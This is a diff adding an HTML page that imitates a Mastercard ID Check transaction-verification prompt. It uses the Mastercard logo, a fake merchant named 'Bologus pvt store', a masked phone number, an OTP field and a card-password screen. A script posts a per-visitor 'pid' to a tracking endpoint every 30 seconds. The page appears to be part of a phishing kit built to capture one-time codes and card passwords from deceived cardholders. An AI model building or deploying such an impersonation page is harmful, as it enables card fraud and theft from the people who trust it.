@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+  <style>
+    .mc-verification-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      z-index: 9999;
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .mc-verification-container {
+      background-color: white;
+      width: 100%;
+      max-width: 500px;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+    
+    .mc-timer {
+      text-align: right;
+      padding: 10px 15px;
+      font-size: 14px;
+      color: #666;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .mc-cancel {
+      color: #D32F2F;
+      font-weight: bold;
+      text-decoration: none;
+      margin-left: 10px;
+      cursor: pointer;
+    }
+    
+    .mc-logo-section {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .bank-logo {
+      height: 40px;
+    }
+    
+    .mastercard-logo {
+      height: 40px;
+    }
+    
+    .mc-content {
+      padding: 20px;
+      text-align: center;
+    }
+    
+    .mc-title {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    
+    .mc-message {
+      margin-bottom: 20px;
+      color: #555;
+      line-height: 1.5;
+    }
+    
+    .mc-otp-input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+    
+    .mc-confirm-btn {
+      background-color: #4a77a9;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    
+    .mc-resend-btn {
+      background-color: white;
+      color: #4a77a9;
+      border: 1px solid #ccc;
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    
+    .mc-indicator {
+      display: flex;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    
+    .mc-dot {
+      width: 10px;
+      height: 10px;
+      background-color: #ccc;
+      border-radius: 50%;
+      margin: 0 5px;
+    }
+    
+    .mc-dot.active {
+      background-color: #4CAF50;
+    }
+    
+    .mc-error {
+      color: #D32F2F;
+      margin-top: -10px;
+      margin-bottom: 15px;
+      display: none;
+      font-size: 14px;
+    }
+    
+    .mc-footer {
+      border-top: 1px solid #eee;
+      padding: 15px 20px;
+    }
+    
+    .mc-accordion {
+      color: #555;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      padding: 10px 0;
+    }
+    
+    .mc-accordion-content {
+      display: none;
+      padding: 10px 0;
+      color: #666;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    
+    .mc-plus {
+      font-size: 24px;
+      color: #666;
+    }
+    
+    /* Mobile-specific styles */
+    @media (max-width: 768px) {
+      .mc-verification-overlay {
+        background-color: white;
+        backdrop-filter: none;
+      }
+      
+      .mc-verification-container {
+        height: 100%;
+        max-width: 100%;
+        border-radius: 0;
+        box-shadow: none;
+        display: flex;
+        flex-direction: column;
+      }
+      
+      .mc-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="mc-verification-overlay" id="mcVerificationOverlay">
+    <div class="mc-verification-container">
+      <div class="mc-timer">
+        <span id="mcTimer">00:30</span>
+        <a class="mc-cancel" id="mcCancel">CANCEL</a>
+      </div>
+      
+      <div class="mc-logo-section">
+        <img src="" alt="Bank Logo" class="bank-logo" id="bankLogo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard ID Check" class="mastercard-logo">
+      </div>
+      
+      <div class="mc-content">
+        <h2 class="mc-title">Verify Transaction</h2>
+        
+        <!-- First screen - OTP code needed -->
+        <div id="otpScreen">
+          <p class="mc-message" id="otpMessage">We just sent a verification code to your registered number via SMS text: ******7636.</p>
+          <p class="mc-message">You are authorizing a payment to <span id="merchantName">Bologus pvt store</span> for <span id="transactionAmount">₹100.00</span>.</p>
+          
+          <input type="text" class="mc-otp-input" id="mcOtpInput" placeholder="Enter verification code">
+          <p class="mc-error" id="mcOtpError">Incorrect verification code. Please try again.</p>
+          
+          <button class="mc-confirm-btn" id="mcConfirmBtn">CONFIRM</button>
+          <button class="mc-resend-btn" id="mcResendBtn">RESEND CODE</button>
+        </div>
+        
+        <!-- Password screen - alternative verification method -->
+        <div id="passwordScreen" style="display: none;">
+          <p class="mc-message">You are authorizing a payment to <span id="merchantName2">Bologus pvt store</span> for <span id="transactionAmount2">₹100.00</span>.</p>
+          
+          <input type="password" class="mc-otp-input" id="mcPasswordInput" placeholder="Enter your password">
+          
+          <button class="mc-confirm-btn" id="mcPasswordConfirmBtn">CONFIRM</button>
+          
+          <div class="mc-indicator">
+            <div class="mc-dot active"></div>
+            <div class="mc-dot active"></div>
+            <div class="mc-dot"></div>
+            <div class="mc-dot"></div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="mc-footer">
+        <div class="mc-accordion" onclick="toggleAccordion('authInfo')">
+          <span>Learn more about Authentication</span>
+          <span class="mc-plus">+</span>
+        </div>
+        <div class="mc-accordion-content" id="authInfo">
+          This additional security step helps protect your card from unauthorized use online. 
+          For more information, contact your card issuer.
+        </div>
+        
+        <div class="mc-accordion" onclick="toggleAccordion('helpInfo')">
+          <span>Need Help?</span>
+          <span class="mc-plus">+</span>
+        </div>
+        <div class="mc-accordion-content" id="helpInfo">
+          If you're experiencing issues with this verification process, please contact your bank's
+          customer service or try another payment method.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function toggleAccordion(id) {
+      const content = document.getElementById(id);
+      if (content.style.display === "block") {
+        content.style.display = "none";
+        content.previousElementSibling.querySelector('.mc-plus').textContent = '+';
+      } else {
+        content.style.display = "block";
+        content.previousElementSibling.querySelector('.mc-plus').textContent = '−';
+      }
+    }
+  </script>
+  <script>
+  // Visitor Heartbeat - keeps track of active visitors
+  function sendHeartbeat() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const pid = urlParams.get('pid') || sessionStorage.getItem('pid');
+    
+    if (pid) {
+      fetch('/api/visitor-heartbeat', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ pid })
+      }).catch(err => console.error('Heartbeat error:', err));
+    }
+  }
+  
+  // Send heartbeat every 30 seconds
+  const heartbeatInterval = setInterval(sendHeartbeat, 30000);
+  
+  // Send initial heartbeat
+  sendHeartbeat();
+  
+  // Clear interval when page is unloaded
+  window.addEventListener('beforeunload', () => {
+    clearInterval(heartbeatInterval);
+  });
+</script>
+</body>
+</html>
